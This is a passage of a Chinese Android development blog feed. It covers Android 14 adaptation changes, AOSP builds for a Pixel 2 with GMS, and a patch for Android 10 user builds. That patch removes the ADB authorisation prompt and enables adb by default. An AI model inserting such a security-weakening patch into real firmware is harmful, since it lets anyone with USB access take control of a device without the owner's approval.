class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">scheduleConfigurationChanged</span><span class="params">(Configuration config)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!attachedToProcess()) &#123;</span><br><span class="line">        ProtoLog.w(WM_DEBUG_CONFIGURATION, <span class="string">&quot;Can&#x27;t report activity configuration &quot;</span></span><br><span class="line">                + <span class="string">&quot;update - client not running, activityRecord=%s&quot;</span>, <span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ProtoLog.v(WM_DEBUG_CONFIGURATION, <span class="string">&quot;Sending new config to %s, &quot;</span></span><br><span class="line">                + <span class="string">&quot;config: %s&quot;</span>, <span class="built_in">this</span>, config);</span><br><span class="line">        mAtmService.getLifecycleManager().scheduleTransaction(app.getThread(), token,</span><br><span class="line">                ActivityConfigurationChangeItem.obtain(config));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="comment">// If process died, whatever.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，应用进程可以根据新配置更新布局等信息。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14(U)适配攻略</title>
      <link href="/2023/09/03/2023-09-03/"/>
      <url>/2023/09/03/2023-09-03/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/20230903/20230903001.jpg"></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Android 14 预览版计划从2023年2月开始启动，正式版会在9-10月份发布。<br><img src="/images/20230903/20230903002.png"></p><h3 id="一、应用行为变更"><a href="#一、应用行为变更" class="headerlink" title="一、应用行为变更"></a>一、应用行为变更</h3><h4 id="1-进程只能杀死自己的后台进程"><a href="#1-进程只能杀死自己的后台进程" class="headerlink" title="1.进程只能杀死自己的后台进程"></a>1.进程只能杀死自己的后台进程</h4><p>  <strong>说明：</strong>从Android 14开始，当应用调用 <strong>killBackgroundProcesses()</strong> 时，该API只能杀死应用自己的后台进程。如果传入其他应用的包名，该方法对其他应用的后台进程没有影响。</p><p>  应用不应使用 <strong>killBackgroundProcesses()</strong> 或以其他方式尝试影响其他应用的进程生命周期。如果应用不必要地杀死其他应用，会降低系统性能并增加电池消耗，因为稍后需要完全重启这些应用，这比恢复现有的缓存应用占用的资源要多得多。</p><h4 id="2-默认情况下拒绝使用精准闹钟"><a href="#2-默认情况下拒绝使用精准闹钟" class="headerlink" title="2.默认情况下拒绝使用精准闹钟"></a>2.默认情况下拒绝使用精准闹钟</h4><p><img src="/images/20230903/20230903004.jpg"></p><p>  <strong>说明：</strong>Android 12中引入的精准闹钟权限<strong>SCHEDULE_EXACT_ALARM</strong>，不再预先授予大多数针对Android 13及更高版本的新安装应用，将默认设置为拒绝。如果用户通过备份还原操作将应用数据传输到Android14的设备上，权限仍然会被拒绝。如果现有的应用已经拥有此权限，它将在设备升级到Android 14 时预先授予。</p><blockquote><p>始终允许以下类型的应用程序调用 <strong>setExact()</strong> 或 <strong>setExactAndAllowWhileIdle()</strong> 方法：</p><ul><li>使用平台证书签名的应用程序；</li><li>特权应用程序；</li><li>电源许可名单上的应用程序（如果应用符合要求，可以使用intent操作+ 请求ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS）</li></ul><p><strong>影响范围：</strong></p><ul><li>targetSdkVersion为33或更高版本的应用；</li><li>在 manifest中声明SCHEDULE_EXACT_ALARM权限；</li><li>不属于豁免或者授权前拥有权限；</li><li>不是日历或者闹钟应用。</li></ul></blockquote><h4 id="3-前台服务类型是必填项"><a href="#3-前台服务类型是必填项" class="headerlink" title="3.前台服务类型是必填项"></a>3.前台服务类型是必填项</h4><p>  <strong>说明：</strong>Android 14 为目标平台，则必须指定适当的前台服务类型。与以前的 Android 版本一样，可组合使用多个类型。</p><blockquote><p>下面列出了可供选择的前台服务类型：</p></blockquote><table><thead><tr><th>Foreground service type declared</th><th>Permission that must be declared</th></tr></thead><tbody><tr><td>camera</td><td>FOREGROUND_SERVICE_CAMERA</td></tr><tr><td>connectedDevice</td><td>FOREGROUND_SERVICE_CONNECTED_DEVICES</td></tr><tr><td>dataSync</td><td>FOREGROUND_SERVICE_DATA_SYNC</td></tr><tr><td>health(Android 14 support)</td><td>FOREGROUND_SERVICE_HEALTH</td></tr><tr><td>location</td><td>FOREGROUND_SERVICE_LOCATION</td></tr><tr><td>mediaPlayback</td><td>FOREGROUND_SERVICE_MEDIA_PLAYBACK</td></tr><tr><td>mediaProjection</td><td>FOREGROUND_SERVICE_MEDIA_PROJECTION</td></tr><tr><td>microphone</td><td>FOREGROUND_SERVICE_MICROPHONE</td></tr><tr><td>phoneCall</td><td>FOREGROUND_SERVICE_PHONE_CALL</td></tr><tr><td>remoteMessaging(Android 14 support)</td><td>FOREGROUND_SERVICE_REMOTE_MESSAGING</td></tr><tr><td>shortService(Android 14 support)</td><td>No additional permission requirements</td></tr><tr><td>specialUse(Android 14 support)</td><td>FOREGROUND_SERVICE_SPECIAL_USE</td></tr><tr><td>systemExempted(Android 14 support)</td><td>FOREGROUND_SERVICE_SYSTEM_EXEMPTED</td></tr></tbody></table><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 示例</span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">...</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.FOREGROUND_SERVICE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">...</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:name</span>=<span class="string">&quot;.MyMediaPlaybackService&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:foregroundServiceType</span>=<span class="string">&quot;mediaPlayback&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  如果应用中的用例与这些类型均不相关，强烈建议您迁移逻辑以使用 <a href="https://developer.android.com/topic/libraries/architecture/workmanager?hl=zh-cn">WorkManager</a> 或<a href="https://developer.android.com/about/versions/14/changes/user-initiated-data-transfers?hl=zh-cn">用户发起的数据传输作业</a>。</p><h4 id="4-将前台服务迁移到用户启动的数据传输作业类型中"><a href="#4-将前台服务迁移到用户启动的数据传输作业类型中" class="headerlink" title="4.将前台服务迁移到用户启动的数据传输作业类型中"></a>4.将前台服务迁移到用户启动的数据传输作业类型中</h4><p>  <strong>说明：</strong>由于Android 14对应用使用前台服务应用了严格的规则，所以在Android 14中，我们引入了一种新的API，用于指定作业是由用户启动的数据传输作业。该API 有助于需要持续时间更长、用户启动的数据传输的用例，例如从远程服务器下载文件。</p><p>  用户启动的数据传输作业由用户启动。这些作业需要通知，立即启动，并且可能会在系统条件允许的情况下运行更长的时间。</p><p>  用户启动的数据传输作业需要新的运行权限： <strong>RUN_USER_INITIATED_JOBS</strong>。系统将会自动授予此权限。如果未在应用manifest中声明权限，系统将抛出<strong>SecurityException</strong>。</p><p>  <strong>影响范围：</strong>targetSdkVersion为34的应用。</p><h4 id="5-语法性别"><a href="#5-语法性别" class="headerlink" title="5.语法性别"></a>5.语法性别</h4><p>Android 14 推出了针对语法性别的 API：<strong>GrammaticalInflectionManager</strong>，其提供了针对单个 App 获取、设置性别偏好的入口。</p><p> <strong>getApplicationGrammaticalGender()</strong> ：获取语法性别偏好，返回的是 Configuration 类中的 int 常量，有这么几种类型：</p><ul><li>   GRAMMATICAL_GENDER_NOT_SPECIFIED, 0：尚未指定性别偏好，将用默认的资源文本</li><li>   GRAMMATICAL_GENDER_NEUTRAL, 1：指定中性、客观的资源文本</li><li>   GRAMMATICAL_GENDER_FEMININE, 2：指定针对女性的资源文本</li><li>   GRAMMATICAL_GENDER_MASCULINE, 3：指定针对男性的资源文本</li></ul><p> <strong>setRequestedApplicationGrammaticalGender()</strong> ：相对应的将上述常量类型动态设置到性别偏好。</p><blockquote><p>这样可以针对不同的性别，加载不同的资源目录：</p><ul><li>女性 —— res/values-fr-feminine</li><li>男性 —— res/values-fr-masculine</li><li>中性 —— res/values-fr</li></ul></blockquote><h3 id="二、用户体验"><a href="#二、用户体验" class="headerlink" title="二、用户体验"></a>二、用户体验</h3><h4 id="1-授予对照片和视频的部分访问权限"><a href="#1-授予对照片和视频的部分访问权限" class="headerlink" title="1.授予对照片和视频的部分访问权限"></a>1.授予对照片和视频的部分访问权限</h4><p>  新增权限：<strong>READ_MEDIA_VISUAL_USER_SELECTED</strong></p><p>  <strong>说明：</strong> 在Android14上与应用交互的用户现在可以授予对其媒体库的部分访问权限（READ_MEDIA_IMAGES和READ_MEDIA_VIDEO）。</p><blockquote><p>新对话框包含以下选项：</p><ul><li>选择照片和视频： Android14中的新功能。用户选择想要提供给应用的特定照片和视频；</li><li>全部允许：用户授予对设备上所有照片和视频的完整库访问权限；</li><li>不允许：用户拒绝所有访问。</li></ul></blockquote><p>  如果用户选择了“选择照片和视频”并且应用稍后再次请求READ_MEDIA_IMAGES 或者 READ_MEDIA_VIDEO权限，系统会显示不同的对话框，让用户有机会授予完全访问的权限，维持现状，或者授予对其他照片和视频的访问权限。为了帮助应用支持新的变化，系统引入了一个新的权限<strong>READ_MEDIA_VISUAL_USER_SELECTED</strong>。</p><blockquote><p>如果应用不声明READ_MEDIA_VISUAL_USER_SELECTED权限，则会发生以下行为：</p><ul><li>在用户与应用会话期间，将会授予对用户选择的照片和视频的READ_MEDIA_IMAGES 和 READ_MEDIA_VIDEO 临时访问权限。当应用移到后台或者当用户主动杀死应用时，系统最终会拒绝这些权限。此行为就像其他一次性权限一样;</li></ul></blockquote><p>  如果应用稍后需要访问其他照片和视频，必须手动请求权限重新获得权限。</p><h4 id="2-改变不可关闭通知的方式"><a href="#2-改变不可关闭通知的方式" class="headerlink" title="2.改变不可关闭通知的方式"></a>2.改变不可关闭通知的方式</h4><p>  <strong>说明：</strong>对于应用向用户显示不可关闭的前台通知，从Android14开始允许用户关闭此类通知。</p><p>  这项变更适用于通过 <strong>Notification.Builder#setOngoing(true)</strong> 或 <strong>NotificationCompat.Builder#setOngoing(true)</strong> 设置 <strong>Notification.FLAG_ONGOING_EVENT</strong> 来阻止用户关闭前台通知的应用。<strong>FLAG_ONGOING_EVENT</strong> 的行为已发生变化，使用户实际上能够关闭此类通知。</p><blockquote><p>在以下情况下，此类通知仍不可关闭：</p><ul><li>当手机处于锁定状态时</li><li>如果用户选择全部清除通知操作（有助于防止意外关闭）</li></ul></blockquote><blockquote><p>此外，这一新行为不适用于以下用例中的不可关闭通知：</p><ul><li>使用 MediaStyle 创建的通知</li><li>安全和隐私用例的政策限制使用</li><li>企业设备政策控制器 (DPC) 和支持软件包</li></ul></blockquote><h4 id="3-非线性字体放大至-200"><a href="#3-非线性字体放大至-200" class="headerlink" title="3.非线性字体放大至 200%"></a>3.非线性字体放大至 200%</h4><p><img src="/images/20230903/20230903005.jpg"></p><p>  <strong>说明：</strong>从Android14开始，系统支持高达200%的字体缩放，为弱视用户提供了符合网络内容无障碍指南 (WCAG) 的其他无障碍功能选项。</p><h4 id="4-区域偏好"><a href="#4-区域偏好" class="headerlink" title="4.区域偏好"></a>4.区域偏好</h4><p>  <strong>说明：</strong>区域偏好使用户能够自定义温度单位、一周的第一天、数字系统。新 Android设置菜单为用户提供了一个集中位置来更改应用程序区域偏好，应用可通过API例如<strong>getTemperatureUnit</strong>和<strong>getFirstDayOfWeek</strong>获取用户设置，以便调整应用内显示信息的方式。</p><h4 id="5-数据安全信息更显眼"><a href="#5-数据安全信息更显眼" class="headerlink" title="5.数据安全信息更显眼"></a>5.数据安全信息更显眼</h4><p>  <strong>说明：</strong>为了加强用户隐私保护，Android 14 增加了系统显示您在 Play 管理中心表单中声明的信息的位置数量。目前，用户可以在 Google Play 中的应用详情的数据安全部分查看此信息。</p><h4 id="6-安全的全屏-intent-通知"><a href="#6-安全的全屏-intent-通知" class="headerlink" title="6.安全的全屏 intent 通知"></a>6.安全的全屏 intent 通知</h4><p>  <strong>说明：</strong> 在 Android 11（API 级别 30）中，任何应用都可以在手机处于锁定状态时使用 <strong>Notification.Builder.setFullScreenIntent</strong> 发送全屏 intent。您可以通过在 AndroidManifest 中声明 <strong>USE_FULL_SCREEN_INTENT</strong> 权限，在应用安装时自动授予此权限。</p><p>  全屏 intent 通知适用于需要用户立即注意的极高优先级通知，例如用户来电或用户配置的闹钟设置。从 Android 14 开始，获准使用此权限的应用仅限于提供通话和闹钟的应用。对于不适合此情况的任何应用，Google Play 商店会撤消其默认的 <strong>USE_FULL_SCREEN_INTENT</strong> 权限。</p><p>  在用户更新到 Android 14 之前，在手机上安装的应用仍拥有此权限。用户可以开启和关闭此权限。</p><p>  您可以使用新 <strong>API NotificationManager.canUseFullScreenIntent</strong> 检查应用是否具有该权限；如果没有，应用可以使用新 intent <strong>ACTION_MANAGE_APP_USE_FULL_SCREEN_INTENT</strong> 启动设置页面，在该页面中，用户可以授予权限。</p><h3 id="三、图形"><a href="#三、图形" class="headerlink" title="三、图形"></a>三、图形</h3><h4 id="1-Path可查询和可插值"><a href="#1-Path可查询和可插值" class="headerlink" title="1.Path可查询和可插值"></a>1.Path可查询和可插值</h4><p>  <strong>说明：</strong>Android的Path API是一种用于创建和渲染矢量图形的强大而灵活的机制，具有描边或填充路径、从线段或二次或三次曲线构建路径、执行布尔运算以获得更复杂的形状。但是对象的内部在创建后对调用者是不透明的。</p><p>  可以调用moveTo()、lineTo()和cubicTo() 添加路径段等方法创建Path，但是没有办法询问该路径的段是什么，因此必须在创建时保留该信息。从 Android 14 开始，可以查询路径里面有些什么，同时支持路径内部插值返回新路径。</p><h3 id="四、安全"><a href="#四、安全" class="headerlink" title="四、安全"></a>四、安全</h3><h4 id="1-限制隐式intent"><a href="#1-限制隐式intent" class="headerlink" title="1.限制隐式intent"></a>1.限制隐式intent</h4><p>  <strong>说明：</strong> Android 通过以下方式限制应用向内部应用组件发送隐式intent：</p><ul><li>   隐式intent仅传递给exported的组件。应用程序必须使用明确的intent传递给unexported的组件，或者将组件标记为exported。</li><li>   如果应用创建一个pending intent，但intent未指定组件或包，系统现在会抛出异常。</li></ul><p>  这些更改可防止恶意应用拦截用在供应用内部组件使用的隐式intent。</p><h4 id="2-更安全的动态代码加载"><a href="#2-更安全的动态代码加载" class="headerlink" title="2.更安全的动态代码加载"></a>2.更安全的动态代码加载</h4><p>  <strong>说明：</strong> 如果应用使用动态代码加载 (DCL)，则所有动态加载的文件都必须标记为只读，否则系统会抛出异常。建议应用尽可能避免动态加载代码，因为这样做会大大增加应用程序因代码注入或代码篡改而受到危害的风险。</p><p>  为防止现有动态加载文件抛出异常，建议尝试在应用中再次动态加载文件之前删除并重新创建这些文件。重新创建文件时，请按照前面的指导在写入时将文件标记为只读。或者将现有文件重新标记为只读，但在这种情况下，强烈建议首先验证文件的完整性（例如，通过根据可信值检查文件的签名），来保护你的app避免被恶意篡改。</p><h4 id="3-Zip路径遍历"><a href="#3-Zip路径遍历" class="headerlink" title="3.Zip路径遍历"></a>3.Zip路径遍历</h4><p>  <strong>说明：</strong>对于以 Android 14 为目标平台的应用，Android 会通过以下方式防止 Zip 路径遍历漏洞：如果 Zip 文件条目名称包含“..”或以“/”开头，<strong>ZipFile(String)</strong> 和 <strong>ZipInputStream.getNextEntry()</strong> 会抛出 <strong>ZipException</strong>。</p><p>  应用可以通过调用 <strong>dalvik.system.ZipPathValidator.clearCallback()</strong> 选择停用此验证。</p><h4 id="4-额外的后台启动activity限制"><a href="#4-额外的后台启动activity限制" class="headerlink" title="4.额外的后台启动activity限制"></a>4.额外的后台启动activity限制</h4><p>  <strong>说明：</strong>系统进一步限制了应用在后台启动 Activity 的时机：</p><ul><li>   当应用发送PendingIntent使用PendingIntent.send()或类似方法时，如果应用想要授予自己的后台activity启动权限以启动intent，则该应用现在必须调用 <strong>setPendingIntentBackgroundActivityStartMode(MODE_BACKGROUND_ACTIVITY_START_ALLOWED)</strong> 来明确的表达意图。</li><li>   当一个可见应用使用bindService()方法绑定另一个在后台运行的应用的服务时 ，如果该可见应用想要将其自己的后台活动启动权限授予绑定服务，则它现在必须添加 <strong>BIND_ALLOW_ACTIVITY_STARTS</strong> 标志。</li></ul><p>  通过这样的限制可以防止恶意应用程序滥用API从后台启动破坏性activity以便保护用户。</p><h4 id="5-广播接收器必须指定导出行为"><a href="#5-广播接收器必须指定导出行为" class="headerlink" title="5.广播接收器必须指定导出行为"></a>5.广播接收器必须指定导出行为</h4><p>  <strong>说明：</strong> 以 Android 14 为目标平台并使用 上下文注册 的接收器的应用和服务指定以下标志，以指定接收器是否应导出到设备上的所有其他应用：<strong>RECEIVER_EXPORTED</strong>或<strong>RECEIVER_NOT_EXPORTED</strong>。此要求有助于使用Android 13 中引入的这些接收器的功能，来保护应用主板安全漏洞的影响。</p><h3 id="五、可升级Android-14的机子"><a href="#五、可升级Android-14的机子" class="headerlink" title="五、可升级Android 14的机子"></a>五、可升级Android 14的机子</h3><p>以下只列出部份品牌：</p><table><thead><tr><th>品牌</th><th>型号</th></tr></thead><tbody><tr><td>谷歌</td><td>Pixel 4a (5G)、Pixel 5、Pixel 5a、Pixel 6、Pixel 6 Pro、Pixel 6a、Pixel 7、Pixel 7 Pro、Pixel 7a、Pixel Tablet、Pixel Fold</td></tr><tr><td>小米</td><td>小米13Pro、小米13、小米12T</td></tr><tr><td>OPPO</td><td>Find N2 Flip、realme GT 2 Pro</td></tr><tr><td>vivo</td><td>X90 Pro、iQOO 11</td></tr><tr><td>一加</td><td>OnePlus 11</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android 10 user版本默认打开usb调试</title>
      <link href="/2023/09/02/2023-09-02/"/>
      <url>/2023/09/02/2023-09-02/</url>
      
        <content type="html"><![CDATA[<h3 id="1-修改framework目录"><a href="#1-修改framework目录" class="headerlink" title="1.修改framework目录"></a>1.修改framework目录</h3><p><strong>framework/base/services/core/java/com/android/server/adb/AdbDebuggingManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--- a/framework/base/services/core/java/com/android/server/adb/AdbDebuggingManager.java</span><br><span class="line">+++ b/framework/base/services/core/java/com/android/server/adb/AdbDebuggingManager.java</span><br><span class="line">@@ -<span class="number">406</span>,<span class="number">7</span> +<span class="number">406</span>,<span class="number">8</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdbDebuggingManager</span> &#123;</span><br><span class="line">                     &#125;</span><br><span class="line">                     logAdbConnectionChanged(key, AdbProtoEnums.AWAITING_USER_APPROVAL, <span class="literal">false</span>);</span><br><span class="line">                     mFingerprints = fingerprints;</span><br><span class="line">-                    startConfirmation(key, mFingerprints);</span><br><span class="line">+                    <span class="comment">//startConfirmation(key, mFingerprints);</span></span><br><span class="line">+                    allowDebugging(<span class="literal">true</span>,key);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure><h3 id="2-修改build目录"><a href="#2-修改build目录" class="headerlink" title="2.修改build目录"></a>2.修改build目录</h3><p><strong>build/core/main.mk</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--- a/build/core/main.mk</span><br><span class="line">+++ b/build/core/main.mk</span><br><span class="line">@@ -<span class="number">292</span>,<span class="number">7</span> +<span class="number">292</span>,<span class="number">7</span> @@ ifneq (,$(user_variant))</span><br><span class="line">   # Target is secure in user builds.</span><br><span class="line">   ADDITIONAL_DEFAULT_PROPERTIES += ro.secure=<span class="number">1</span></span><br><span class="line">   ADDITIONAL_DEFAULT_PROPERTIES += security.perf_harden=<span class="number">1</span></span><br><span class="line">+  ADDITIONAL_DEFAULT_PROPERTIES += persist.sys.usb.config=adb</span><br><span class="line">   <span class="title function_">ifeq</span> <span class="params">($(user_variant)</span>,user)</span><br><span class="line">     ADDITIONAL_DEFAULT_PROPERTIES += ro.adb.secure=<span class="number">1</span></span><br><span class="line">   endif</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android10源码刷入Pixel2以及整合GMS</title>
      <link href="/2023/08/27/2023-08-27/"/>
      <url>/2023/08/27/2023-08-27/</url>
      
        <content type="html"><![CDATA[<h2 id="一、ASOP源码下载"><a href="#一、ASOP源码下载" class="headerlink" title="一、ASOP源码下载"></a>一、ASOP源码下载</h2><p>具体可以参考我之前发布的文章</p><h2 id="二、下载相关驱动包"><a href="#二、下载相关驱动包" class="headerlink" title="二、下载相关驱动包"></a>二、下载相关驱动包</h2><p>这一步很关键，关系到编译后的镜像能否刷入后运行</p><p>下载链接：<a href="https://developers.google.com/android/drivers">Nexus 和 Pixel 设备的驱动程序二进制文件</a></p><p><img src="/images/20230827/20230827150006.png"></p><p>如下图所示，将两个驱动程序上传到Ubuntu服务器，并进行解压，得到两个脚本：</p><p><img src="/images/20230827/202308271401001.jpg"></p><p>下载解压后会有两个脚本文件，运行后输入I ACCEPT就会得到一个vendor文件夹的文件夹</p><h2 id="三、AOSP源码编译"><a href="#三、AOSP源码编译" class="headerlink" title="三、AOSP源码编译"></a>三、AOSP源码编译</h2><p>首先加载配置文件，然后选择机型</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source build/envsetup.sh</span><br><span class="line">lunch aosp_walleye-userdebug</span><br></pre></td></tr></table></figure><p>这里直接输入lunch就能看到可以编译的全部机型，然后选择对应的机型就行</p><p>然后就直接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j6</span><br></pre></td></tr></table></figure><p>如果期间有什么报错可以百度，修复后，直接make -j6继续运行就行。</p><p>经过漫长的等待，6个小时，终于成功了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ 99% 101428/101980] //art/build/apex:art-check-debug-apex-gen generate art-check-debug-apex-gen.dummy</span><br><span class="line">--bitness=auto, trying to autodetect. This may be incorrect!</span><br><span class="line">  Detected multilib</span><br><span class="line"><span class="meta prompt_">[100% </span><span class="language-bash">101980/101980] Target vbmeta image: out/target/product/walleye/vbmeta.img</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">### build completed successfully (05:52:50 (hh:mm:ss)) ####</span></span></span><br></pre></td></tr></table></figure><p>编译之后的输入镜像文件，其所在路径为”/out/target/product/walleye”</p><h2 id="四、刷入镜像"><a href="#四、刷入镜像" class="headerlink" title="四、刷入镜像"></a>四、刷入镜像</h2><h3 id="1-打开OEM开关"><a href="#1-打开OEM开关" class="headerlink" title="1.打开OEM开关"></a>1.打开OEM开关</h3><p>先点击设置—关于手机—-版本号七次—开发者选项—打开OEM解锁（这步必须可以上网，否则打不开）</p><h3 id="2-启动进入fastboot模式"><a href="#2-启动进入fastboot模式" class="headerlink" title="2.启动进入fastboot模式"></a>2.启动进入fastboot模式</h3><p>方法1：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure><p>方法2:<br>使用下图的快捷键，我的手机Pixel2 就是音量减键和电源键<br><img src="/images/20230827/20230827T07-34-57.146Z.png"></p><p>成功fastboot模式进入，如下图：<br><img src="/images/20230827/202308271401002.jpg"></p><h3 id="3-解锁手机"><a href="#3-解锁手机" class="headerlink" title="3.解锁手机"></a>3.解锁手机</h3><p>对于新款设备（2015 年及之后发布的设备）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flashing unlock</span><br></pre></td></tr></table></figure><p>对于老款设备（2014 年及之前发布的设备）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot oem unlock</span><br></pre></td></tr></table></figure><p>解锁确认界面，如下图：<br><img src="/images/20230827/202308271401003.jpg"></p><h3 id="4-刷机"><a href="#4-刷机" class="headerlink" title="4.刷机"></a>4.刷机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd out/target/product/walleye</span><br><span class="line">fastboot flashall -w</span><br></pre></td></tr></table></figure><p>成功进入桌面，如下图：<br><img src="/images/20230827/202308271401004.jpg"></p><h3 id="5-windows挂载-Ubuntu服务器的情况"><a href="#5-windows挂载-Ubuntu服务器的情况" class="headerlink" title="5.windows挂载 Ubuntu服务器的情况"></a>5.windows挂载 Ubuntu服务器的情况</h3><p>在进行刷机时，需要设置环境变量ANDROID_PRODUCT_OUT。 如果是windows 需要指向其编译机器下的镜像输出目录。要想实现共享，需要在Ubuntu Server上安装和配置samba服务器。<br>1.在windows中，将服务器编译输出目录，映射为本地文件夹，编译访问<br>2.设置Windows环境变量<br><img src="/images/20230827/20230831150007.jpg"></p><h3 id="5-刷入部分镜像"><a href="#5-刷入部分镜像" class="headerlink" title="5.刷入部分镜像"></a>5.刷入部分镜像</h3><p>由于常常修改的都是System镜像部分内容，但是编译出来的System有两个部分system.img和system_other.img使用这里就讲一讲System一个如何单独刷入进去。</p><p>于Android8之后采用A/B更新, 所以有2套分区, 刷分区方式和以往不同:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash system system.img</span><br><span class="line">fastboot flash system_a system_other.img</span><br><span class="line">fastboot set_active b</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure><h2 id="五、添加GMS服务"><a href="#五、添加GMS服务" class="headerlink" title="五、添加GMS服务"></a>五、添加GMS服务</h2><p>GMS是Google Map/Chrome/Youtube等Google软件，是Google私有的套件。只有与Google签订合同的手机厂商可以预加载GMS。因此，虽然我们编译AOSP是Android官方发布，但不会包含GMS预加载。<br>理论上，Google为了同时保持开放性和服务可靠性，可以说是放水了。它让解锁后的手机可以安装GMS到Android系统。而重点是“解锁后”，所以Google不会告你侵权，只要不是预装在市售ROM就可以。于是<strong>Open GAPP</strong>计划就产生了，它让第三方ROM可以使用GMS及其服务。<a href="https://opengapps.org/">Open Gapps官网</a><br>OpenGapps也有教你如何把GMS整合进整个源代码<a href="https://github.com/opengapps/aosp_build">https://github.com/opengapps/aosp_build</a></p><h3 id="1-修改manifest-xml"><a href="#1-修改manifest-xml" class="headerlink" title="1.修改manifest.xml"></a>1.修改manifest.xml</h3><p>找到你的清单文件.repo\manifests\default.xml，并在末尾添加以下内容:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">remote</span> <span class="attr">name</span>=<span class="string">&quot;opengapps&quot;</span> <span class="attr">fetch</span>=<span class="string">&quot;https://github.com/opengapps/&quot;</span>  /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">remote</span> <span 